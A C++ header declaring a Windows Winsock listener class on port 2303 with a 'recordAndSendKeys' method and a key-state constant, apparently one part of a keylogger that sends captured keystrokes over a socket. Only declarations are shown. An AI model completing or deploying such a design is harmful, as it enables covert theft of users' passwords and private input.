#pragma once
#include <iostream>
#include <WinSock2.h>
#include <Windows.h>
#include <ws2tcpip.h>

#define ACTIVE_PROMISE_CODE -32767

class Listener {
private:
	WSADATA _wsa_data;
	sockaddr_in _listen_socket_info;
	sockaddr_in _client_sock_info;
	SOCKET _listen_socket;
	SOCKET _client_socket;
	const int _port = 2303;
	
public:
	int init();
	int listenAndAccept();
	int recordAndSendKeys();
};